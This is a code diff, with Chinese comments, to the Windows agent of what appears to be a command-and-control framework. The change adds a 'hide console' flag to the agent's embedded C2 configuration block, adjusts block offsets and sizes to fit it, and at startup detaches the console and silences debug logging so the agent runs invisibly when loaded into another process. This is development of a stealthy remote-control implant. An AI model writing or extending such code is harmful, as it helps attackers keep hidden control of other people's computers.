@@ -84,8 +84,11 @@ static std::string resolve_ws_host(const std::string& wh);
 // 不在无控制台时调用 AllocConsole：PE 子系统改为 GUI 后加载器本就不建控制台，若此处再
 // AllocConsole，会主动弹出窗口，与「隐藏控制台」载荷选项完全抵消。CUI 进程由系统附带控制台，
 // GetConsoleWindow() 非空，printf 仍正常；纯 GUI 运行时调试输出无可见窗口（可用调试器查看）。
+// 勾选「隐藏控制台」且 C2 flags 写入 HIDE_CONSOLE 时，启动处 FreeConsole + 静默本函数（同进程 loader 场景）。
+static std::atomic<bool> g_agent_dbg_quiet{false};
 static std::mutex g_dbg_mu;
 static void agent_dbg(const char* fmt, ...) {
+    if (g_agent_dbg_quiet.load()) return;
     char buf[1024];
     va_list ap;
     va_start(ap, fmt);
@@ -157,7 +160,10 @@ static bool host64_all_zero(const unsigned char* p) {
 
 static bool is_c2_template_block(const unsigned char* b) {
     if (memcmp(b, "C2EMBED1", 8) != 0) return false;
-    if (memcmp(b + 404, "C2EMBED2", 8) != 0) return false;
+    if (memcmp(b + 408, "C2EMBED2", 8) != 0) return false;
+    uint32_t fl = 0;
+    memcpy(&fl, b + 404, 4);
+    if (fl != 0) return false;
     if (!host64_all_zero(b + 8)) return false;
     uint32_t tp, wp;
     memcpy(&tp, b + 72, 4);
@@ -180,7 +186,10 @@ static bool block_looks_patched(const unsigned char* b) {
         if (b[336 + k] == ':') return true;
     uint32_t wp;
     memcpy(&wp, b + 400, 4);
-    return wp != 0;
+    if (wp != 0) return true;
+    uint32_t fl;
+    memcpy(&fl, b + 404, 4);
+    return fl != 0;
 }
 
 static bool c2_runtime_scan_pick(const unsigned char** img_base, size_t* img_sz, size_t* off) {
@@ -189,11 +198,11 @@ static bool c2_runtime_scan_pick(const unsigned char** img_base, size_t* img_sz,
     if (!GetModuleInformation(GetCurrentProcess(), mod, &mi, sizeof(mi))) return false;
     const unsigned char* img = (const unsigned char*)mi.lpBaseOfDll;
     size_t sz = (size_t)mi.SizeOfImage;
-    if (!img || sz < 412) return false;
+    if (!img || sz < 416) return false;
     std::vector<size_t> hits;
-    for (size_t i = 0; i + 412 <= sz; i++) {
+    for (size_t i = 0; i + 416 <= sz; i++) {
         if (memcmp(img + i, "C2EMBED1", 8) != 0) continue;
-        if (memcmp(img + i + 404, "C2EMBED2", 8) != 0) continue;
+        if (memcmp(img + i + 408, "C2EMBED2", 8) != 0) continue;
         hits.push_back(i);
     }
     if (hits.empty()) return false;
@@ -331,7 +340,7 @@ static void agent_dbg_dump_c2_embed() {
     uintptr_t base = mod ? (uintptr_t)mod : 0;
     uintptr_t va = (uintptr_t)(const void*)&e;
     agent_dbg("--- C2 embed (server PatchC2Embed fields) ---");
-    agent_dbg("g_c2_embed VA=%p image_base=%p RVA=0x%zx sizeof=%zu (Go TotalSize=412)",
+    agent_dbg("g_c2_embed VA=%p image_base=%p RVA=0x%zx sizeof=%zu (Go TotalSize=416)",
               (void*)va, (void*)base, base ? (size_t)(va - base) : (size_t)0, sizeof(C2EmbedConfig));
     {
         const unsigned char* img = nullptr;
@@ -364,6 +373,8 @@ static void agent_dbg_dump_c2_embed() {
     agent_dbg("salt        : len=%zu [%s]", sl.size(), sl.c_str());
     agent_dbg("heartbeat_sec: %u", (unsigned)e.heartbeat_sec);
     agent_dbg("web_host[64]: [%s]  web_port_le=%u", wh.c_str(), (unsigned)e.web_port_le);
+    agent_dbg("flags_le: %u (hide_console_bit=%d)", (unsigned)e.flags_le,
+              (e.flags_le & C2_EMBED_FLAG_HIDE_CONSOLE) ? 1 : 0);
 
     embed_hex_line("tail_magic[8] hex", e.tail_magic, sizeof(e.tail_magic));
     agent_dbg("tail_magic str: [%s] memcmp_ok=%d", embed_zstr(e.tail_magic, sizeof(e.tail_magic)).c_str(),
@@ -788,7 +799,7 @@ static std::string arch_key_from_si() {
         case PROCESSOR_ARCHITECTURE_ARM64:
             return "arm64";
         case PROCESSOR_ARCHITECTURE_INTEL:
-            return "x86";
+            return "ia32";
         default:
             return "unknown";
     }
@@ -2381,8 +2392,27 @@ static void heartbeat_loop() {
     }
 }
 
+// 与载荷「隐藏控制台」一致：C2 flags 含 HIDE_CONSOLE 时脱离宿主控制台并静默 agent_dbg（loader 同进程场景）。
+static uint32_t c2_embed_flags_le() {
+    const unsigned char* img = nullptr;
+    size_t sz = 0, off = 0;
+    if (c2_runtime_scan_pick(&img, &sz, &off)) {
+        uint32_t f;
+        memcpy(&f, img + off + 404, 4);
+        return f;
+    }
+    return g_c2_embed.flags_le;
+}
+
+static void apply_embed_console_policy() {
+    if ((c2_embed_flags_le() & C2_EMBED_FLAG_HIDE_CONSOLE) == 0) return;
+    if (GetConsoleWindow() != nullptr) FreeConsole();
+    g_agent_dbg_quiet.store(true);
+}
+
 int main() {
     srand((unsigned)GetTickCount());
+    apply_embed_console_policy();
     WSADATA wsa;
     WSAStartup(MAKEWORD(2, 2), &wsa);
     agent_dbg("start pid=%lu", (unsigned long)GetCurrentProcessId());
